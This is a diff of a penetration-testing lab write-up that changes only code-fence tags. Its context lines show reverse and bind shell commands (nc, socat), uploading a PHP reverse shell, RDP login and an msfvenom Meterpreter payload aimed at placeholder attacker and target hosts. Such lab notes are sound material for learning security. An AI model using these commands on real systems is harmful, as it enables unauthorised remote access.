@@ -36,7 +36,7 @@ We can check that it works by accessing the file on the server at `<SERVER_IP>/u
 
 On the attacking machine, we set up a listener at port 6000:
 
-```console
+```sh
 ~$ nc -lnvp 6000
 ```
 
@@ -53,7 +53,7 @@ We edit the reverse shell script found in `/usr/share/webshells`, changing the I
 
 We then upload this file onto the server. We set up a Netcat listener at the designated port:
 
-```console
+```sh
 ~$ nc -lnvp 1234
 ```
 Then, we activate the shell by accessing the file at `<SERVER_IP>/uploads/php-reverse-shell.php`.
@@ -149,7 +149,7 @@ Once the command is run successfully, we can check the users in the "administrat
 
 We can then login to the Windows machine via RDP using the command
 
-```console
+```sh
 ~$ xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<TARGET_IP> /u:<USERNAME> /p:'<PASSWORD>'
 ```
 
@@ -185,7 +185,7 @@ The Netcat bind shell is similar. We setup a listener on the target using
 
 Then, we connect to the listener on our attacking machine using
 
-```console
+```sh
 ~$ nc <TARGET-IP> <PORT>
 ```
 
@@ -199,7 +199,7 @@ The end result should look like:
 
 The attacker sets up a listener using 
 
-```console
+```sh
 ~$ socat TCP-L:<PORT> -
 ```
 
@@ -221,7 +221,7 @@ The target sets up a listener using
 
 while the attacking machine connects to the listener using
 
-```console
+```sh
 ~$ socat TCP:<TARGET_IP>:<PORT> -
 ```
 
@@ -233,7 +233,7 @@ while the attacking machine connects to the listener using
 
 We generate the payload using the command
 
-```console
+```sh
 ~$ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o msfshell.exe LHOST=<ATTACKER_IP> LPORT=<PORT>
 ```
 
